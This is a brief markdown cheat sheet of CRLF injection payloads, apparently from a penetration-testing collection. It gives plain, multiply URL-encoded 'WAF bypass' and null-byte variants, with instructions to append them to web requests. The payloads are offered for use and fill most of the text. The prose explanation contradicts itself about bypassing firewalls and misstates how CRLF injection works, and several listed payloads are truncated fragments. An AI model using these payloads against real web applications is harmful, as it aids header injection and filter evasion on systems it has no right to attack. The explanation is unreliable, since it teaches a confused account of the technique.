# CRLF-Payloads

Here are some examples of how to use CRLF injection payloads:

* **Normal payloads:**
    * %0D%0A
    * \r\n
    * \n
    * %0A
    * \r
    * %0D

These payloads can be used to inject a newline character into a web request, which can then be used to bypass certain security controls. For example, a CRLF injection payload could be used to bypass a web application firewall (WAF) that is configured to block requests that contain newline characters.

* **WAF bypass payloads:**
    * %250D%250A
    * %250A
    * %250D
    * %25250D%25250A
    * %25250A
    * %25250D

These payloads can be used to bypass WAFs that are configured to block requests that contain certain characters, such as newline characters. For example, a WAF bypass payload could be used to inject a newline character into a web request, even if the WAF is configured to block requests that contain newline characters.

To use a CRLF injection payload, you can simply add the payload to the end of a web request. For example, if you are making a request to the URL `http://example.com/index.php`, you could add the payload `%0D%0A` to the end of the URL, like this:

`http://example.com/index.php%0D%0A`

When the web server receives the request, it will interpret the payload as a newline character and process the request accordingly. This could allow you to bypass certain security controls, such as WAFs.

More Payloads:

0D%0A
r\n
n
0A
r
0D
250D%250A
250A
250D
%25250D%25250A
%25250A
%25250D
%0D%0A%00
\r\n\00
\n\00
%0A\00
\r\00
%0D\00
%250D%250A%2500
%250A%2500
%250D%2500
%25250D%25250A%252500
%25250A%252500
%25250D%252500
%0D%0A%2500
\r\n%2500
\n%2500
%0A%2500
\r%2500
%0D%2500
%250D%250A%252500
%250A%252500
%250D%252500
%25250D%25250A%25252500
%25250A%25252500
%25250D%25252500
%0D%0A%25%300
\r\n%25%300
\n%25%300
%0A%25%300
\r%25%300
%0D%25%300
%250D%250A%25%25300
%250A%25%25300
%250D%25%25300
%25250D%25250A%25%2525300
%25250A%25%2525300
%25250D%25%2525300
%0D%0A%2525300
\r\n%2525300
